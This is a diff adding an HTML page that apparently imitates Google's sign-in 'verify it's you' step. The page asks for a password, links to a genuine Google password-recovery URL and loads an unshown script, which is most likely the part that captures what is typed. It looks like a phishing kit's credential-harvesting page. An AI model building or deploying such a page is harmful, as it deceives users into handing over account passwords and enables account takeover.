@@ -1,0 +1,84 @@
+<!DOCTYPE html >
+<html>
+<head>
+ <meta charset="UTF-8">
+    <meta name="viewport" 
+          content="width=device-width,      initial-scale=1.0">
+
+    <title></title>
+    
+    <link rel="stylesheet" href="../css/style.css" />
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+                <!--                                                                                              <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet"
+          href="https://fonts.googleapis.com/css?family=Tangerine">-->
+</head>
+<body>
+<div class="container">
+     <div class="logo"></div>
+</div>
+  <div class="singin">
+    Welcome
+  </div>
+   <div class="text accounty">   
+<button class="select" >
+<i class="fa fa-user-circle-o"> </i> &#160  <span class="emt" ><b class="mail"></b></span> &#160 
+ <i class="	fa fa-caret-down" style="padding-right:2px;" ></i>
+ </button>
+ 
+</div>
+<div class="text" style="margin-top: 10%; position: relative;"> To continue, first verify it's you </div>
+    <div class="inputmail">
+         <div class="addp add" id="lop" >Enter your password </div>
+        <input class="password " id="input1"  type= password placeholder=" Enter ypur password"  requried> </input>
+       <br>
+        <b><input type="checkbox"  id="vehicle1" name="vehicle1" onclick="myFunction()"  value="Bike" style="margin-top:4%; font-weight:bold; paddind:20px;" ></input></b>
+         <label for="vehicle1"  style="margin-top:4%;position:absolute; margin-left:6%;  font-size:14px; font-weight:bold;  font-family: Arial, sans-serif; width:40%; font-spacing:1px;"> Show password </label>
+        
+
+     <br>
+     
+        <div class="can"> 
+             <a href=" https://accounts.google.com/v3/signin/challenge/dp?TL=ALoj5Aq5FuSRjZ2YOFqgsZB3bp0J_UzmgY7Q-tlnoW4eIRlh59xO3hjkJHiZxqbV&btmpl=mobile&checkConnection=youtube%3A880&checkedDomains=youtube&cid=5&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F%3Fview&ddm=0&dsh=S-284368289%3A1723135526106465&emr=1&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=AdF4I778skdLYs_TMYwxhhV98sfL3t9k79_7PpgSdHZuarWRWEErXDQYGuYUXGpylzIpgMj75qlB&ltmpl=ecobx&osid=1&pstMsg=1&scc=1&service=mail"  class="fgl acc" >Forgot password?</a>
+              <button class="next"> Next </button>
+       </div>
+    </div>
+
+
+
+<script>
+        function focusInput() {
+            document.getElementById("input1").focus();
+             document.getElementById("lop").style.display ="block";
+         document.getElementById("input1").placeholder =" ";
+
+    const input = document.getElementById('input1');
+
+   // it will remove placeholder value on focus and store with dataset variable
+  input.addEventListener('focus', (e) => {
+    e.placeholder = '';
+  });
+        } 
+    window.onload = function() {
+      focusInput()
+};
+
+
+
+
+function myFunction() {
+  var x = document.getElementById("input1");
+  if (x.type === "password") {
+    x.type = "text";
+  } else {
+    x.type = "password";
+  }
+}
+
+
+    </script>
+  
+<script src="./js/script.js"></script>
+</body>
+</html>
